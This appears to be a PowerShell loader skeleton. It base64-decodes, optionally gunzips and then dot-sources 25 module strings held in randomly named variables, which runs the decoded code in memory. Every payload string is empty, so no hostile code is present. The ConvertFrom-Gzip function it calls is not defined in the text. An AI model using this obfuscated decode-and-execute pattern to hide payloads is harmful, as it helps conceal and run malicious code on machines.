#Requires -Version 2

$Explicated = ""
$Opposition = ""
$Lambasting = ""
$Underlings = ""
$Unlatching = ""
$Castrating = ""
$Scalloping = ""
$Apoplectic = ""
$Mentioning = ""
$Quartettes = ""
$Settlement = ""
$Lighthouse = ""
$Concoction = ""
$Antagonism = ""
$Monographs = ""
$Inherently = ""
$Absolutism = ""
$Paunchiest = ""
$Florentine = ""
$Casseroles = ""
$Equivocate = ""
$Fortresses = ""
$Schooldays = ""
$Infinitely = ""
$Vanishings = ""

$Modules = @($Explicated,$Opposition,$Lambasting,$Underlings,$Unlatching,$Castrating,$Scalloping,$Apoplectic,$Mentioning,$Quartettes,$Settlement,$Lighthouse,$Concoction,$Antagonism,$Monographs,$Inherently,$Absolutism,$Paunchiest,$Florentine,$Casseroles,$Equivocate,$Fortresses,$Schooldays,$Infinitely,$Vanishings)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
}
